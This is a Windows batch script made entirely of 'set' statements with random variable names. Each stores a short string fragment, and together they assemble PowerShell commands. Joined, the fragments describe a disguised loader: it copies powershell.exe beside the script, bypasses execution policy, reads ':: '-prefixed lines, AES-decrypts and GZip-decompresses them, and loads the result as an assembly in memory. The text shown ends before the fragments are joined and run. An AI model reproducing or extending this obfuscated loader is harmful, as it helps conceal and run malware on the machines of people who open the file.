@echo off
set "CAkuitrlSl=we"
set "eKyBIYVGwB=nd"
set "OhLhrrEASA=s\"
set "jbuOODpSua=co"
set "tWfMeeSMor= /"
set "duajrlaufg=he"
set "zsAecWwXrL=\v"
set "rxHIoKvAVD=:\"
set "zgtKswloIb=y "
set "uFilMlXHfc=po"
set "JFqIuaSbXi=0\"
set "uvOWoiJIMb=32"
set "ExLhZZxBfZ=he"
set "CWzTuggwIW=we"
set "CYdjqSwzAj=ll"
set "NyDMSsGNjS=in"
set "TIktDWRcdV=Po"
set "JHjLApabLR=.e"
set "COSBIOifUf=ow"
set "YWlnbRfIvl=rS"
set "HIVJWtahfS=do"
set "IUMraWZqkq=em"
set "PkfNrmaAZT= C"
set "OOdtbzEfWg=st"
set "hDmRRiuWza=ll"
set "IfEgAUcSKc=rs"
set "PVtUqGOibb=ws"
set "RiGSrekrUu=1."
set "PcfEqZdrfR=\W"
set "ntekPHZfZq=Sy"
set "ieXcYhAacX=xe"
set "oxGFVQZHwP=Wi"
set "mPNjPkHGLF=py"
set "tiJmPTkdIh= %~dp0"
set "bRPmzKIEXO=cd"
set "DZafehyVDy=ing("
set "kSWjgrgXLj=.Mod"
set "cTtfToWsBT=ateD"
set "yLpsgKSozf=$ZRM"
set "TEyAsUjImH=Bmor"
set "zZOZpDXLbm=GMQm"
set "JHplAzkDJW=Kh.T"
set "yCvKuojhdu=i = "
set "YObdzUmuBD=yste"
set "QzKUYghkbM=ring"
set "EfMFkNNaZh== [S"
set "TupUWuyKnS=pStr"
set "KZEvGmuRKN=brea"
set "ylUiishHzB=)))"
set "neIQqqQNkq=hy.A"
set "NSBouLxvXX=();$"
set "qYwJBxJAWA=comp"
set "eXAYQaqwjD=rjgx"
set "VpZeIbxAPn=aWqS"
set "pjATRvUZkK=ewLi"
set "VsAtpELRDq=esMa"
set "PgENbVmCUh=yste"
set "jmTBuzDfrA=[Sys"
set "gDwwDTojoT=;$IG"
set "CpsDysMSZJ=form"
set "xqgOjScWsF=)($a"
set "uAOWIZVObH=n ''"
set "pHREBCEORw=m(, "
set "ephpbzwTMV=y.Cr"
set "TRFeOntRsV=yTo("
set "VCNDCcEOWL=$LQo"
set "nUEzHETYIF= if "
set "xEDrTGDESc=ZF.T"
set "xeACJmbQNn=Kh ="
set "hZEZWhrMqs=($SD"
set "bhuZHlPhdO=QoKh"
set "hgkdvgPWbN=, $a"
set "PEiwtRkghU=File"
set "OaFlzzivjF=.Cry"
set "qRwpKFLjKX=bjec"
set "FRrwjtRtWy=bypa"
set "RwirEnClao=[IO."
set "fWKUTuybTW=v4Ir"
set "VIMsIqIQmL=PKCS"
set "rxjyGKRbjv=Si);"
set "ktomWvKKgL=1] -"
set "ioUUOVoUSV=.-16"
set "nXKiiHjRmh=ress"
set "vfOcFfoJHa=stem"
set "kdNPQqgwjn=sion"
set "JRNKadhHha=raph"
set "fBZuHMhtZh=Disp"
set "VhCNVqbWrk=daeR"
set "gDKWSssZbH=6] -"
set "dqMfBYYXLc=e = "
set "yXCBMfEfjp=yste"
set "cpVyAFMeXX= = $"
set "XXcHoVKzzj=grap"
set "kDglPElrUF=fore"
set "OwappMKyey=F'[-"
set "iLpwhFiwgi=-1.."
set "ykxDizUIHN=em.C"
set "yVSZXzmJrn=Mode"
set "axNxNePqrH=ct S"
set "TWtadCOOTT=-ep "
set "KxwgZdWoBq=6esa"
set "JIhUGClDaP=bstr"
set "xRlBRSqBiX=m.IO"
set "crdztzGIXu=ion."
set "slFnaJVwAh=]::N"
set "nbutDhmaSA=ck($"
set "vzmjdoTjMJ=1..-"
set "VnRoDcJSlv=::De"
set "fUMqwgzjTH=ZYYc"
set "LYYGaMRolj=$LQo"
set "nOpHggyeiX= = ["
set "ABOrIQCjtx== $e"
set "WpfbDllIYW=[]] "
set "IoGururPJw==');"
set "EPyfkSyybq=oArr"
set "TXPftnjcBc=BC;$"
set "IzanzxeSKB=[Sys"
set "tcsBnYjYYD=pres"
set "bcjonBgFns=] -j"
set "RvbKqHYqbG=).Sp"
set "oTdSbrWXTR=flec"
set "wPiCtYCIfV=.Cop"
set "sYsNNIfGel=ptog"
set "nritsCyRIk=rity"
set "NsmspaiILd=.Cry"
set "yTQfVaMCGn=-4] "
set "wvfLvRYBtO=pher"
set "gwofJnuojg=mLUX"
set "XNMwUIkIyK=UGTu"
set "eqVLAzrYsq=:: '"
set "CtCURUaBoX=ecry"
set "yElYkCNxUL=y.Pa"
set "hkqFVUYeRO=Fina"
set "RbkolRxsYQ= New"
set "TKFjUQJUNP=aWqS"
set "UjkbEfRTbb=X.Pa"
set "YoBJIMVLnQ=y]::"
set "VdtupnxcXi=join"
set "ZOAvVLzeDP=ptog"
set "cEvXQUPzYn=;$Lr"
set "NsXnKPNTTv=fy, "
set "sqFZRoIvyO=se()"
set "tykdUurowd=n ''"
set "fmBQVEEqjq=.Mem"
set "crNXuiZkuB=New-"
set "bzQIlgqnOm=ss -"
set "IYlrUaafgD=WqSi"
set "CuFlGmXHPt=ect "
set "sPFscJouxy= [Sy"
set "ehbyrDtKRw=Star"
set "rdppsMqEjo=ypto"
set "ddSCxzYswn=('%*'"
set "JboVEKOKuj=Syst"
set "EStghZCFLf=3); "
set "owzFdGbLnu=('l0"
set "xSNxAVEBsl=gMod"
set "BfYrHBTgPp= = $"
set "IoOWUlGSRY=raph"
set "NHkPPMGPGN=Si ="
set "thAFjirPPi=[Env"
set "mzbBBumsXR=N) {"
set "IVhwhbCjAW=y = "
set "trKUDqkIMS=ach "
set "CESuPPfuOk=.Key"
set "RMszqfHnrp=);$e"
set "bzIeLIDktv=.Dis"
set "KbDiyyvhyF=Comp"
set "juDGPCghvq='[-1"
set "tbKCozdJHe=.Cre"
set "WQuCCOnHTv=stem"
set "WVjFlRortA=MZF."
set "NiAwAnoPTY=Z.En"
set "rZzJaTdqIv=tsWi"
set "FYcmQrlmpG=.Sec"
set "aaAJKlwRTg=rans"
set "LBszXfCJiw=MZF "
set "XleISbRysJ=mLUX"
set "AystCbxSLv=ose("
set "HOzDkDQEcM= [st"
